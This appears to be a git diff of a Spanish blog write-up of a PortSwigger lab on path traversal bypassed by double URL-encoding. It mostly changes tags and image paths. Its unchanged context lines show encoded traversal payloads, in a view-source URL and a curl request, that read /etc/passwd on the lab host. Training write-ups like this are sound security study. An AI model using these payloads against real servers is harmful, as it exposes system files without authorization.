@@ -6,25 +6,15 @@ categories:
   - Portswigger
   - Path Traversal
 tags:
-  - Path
-  - Traversal
-  - File
-  - path
-  - traversal,
-  - traversal
-  - sequences
-  - blocked
-  - with
-  - absolute
-  - path
-  - bypass
+  - Path Traversal
+  - File path traversal, traversal sequences stripped with superfluous URL-decode
 image:
-  path: /assets/img/Path-Traversal-Lab-2/Portswigger.png
+  path: /assets/img/Path-Traversal-Lab-4/Portswigger.png
 ---
 
 ## Skills
 
-- File path traversal, traversal sequences stripped non-recursively
+- File path traversal, traversal sequences stripped with superfluous URL-decode
 
 ## Certificaciones
 
@@ -44,11 +34,11 @@ Este `laboratorio` contiene una `vulnerabilidad` de `path traversal` en la `visu
 
 Al `acceder` a la `web` nos sale esto
 
-![](/assets/img/Path-Traversal-Lab-2/image_1.png)
+![](/assets/img/Path-Traversal-Lab-4/image_1.png)
 
 Si hacemos `Ctrl + U` vemos como se están `cargando` las `imágenes`
 
-![](/assets/img/Path-Traversal-Lab-2/image_2.png)
+![](/assets/img/Path-Traversal-Lab-4/image_2.png)
 
 En la web de hacktricks [https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding](https://book.hacktricks.xyz/pentesting-web/file-inclusion#encoding) hay un apartado `Encoding` del cual podemos extraer payload encodedos
 
@@ -112,9 +102,9 @@ Si lo queremos hacerlo desde la `web` debemos poner `view-source://`
 view-source:https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd
 ```
 
-![](/assets/img/Path-Traversal-Lab-2/image_3.png)
+![](/assets/img/Path-Traversal-Lab-4/image_3.png)
 
-Otra opción sería capturar la petición que se da al cargar una imagen `https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=54.jpg` con el Burpsuite y encodear el input de filename dos veces. Podemos urlencodear todos los caracteres o solo barras, solo puntos u ambas
+Otra opción sería `capturar` la `petición` que se da al cargar una imagen `https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=54.jpg` con el `Burpsuite` y `encodear` el `input` de `filename` dos veces. Podemos `urlencodear` todos los `caracteres` o solo `barras`, solo `puntos` u `ambas`
 
 ```
 # curl 'https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'            
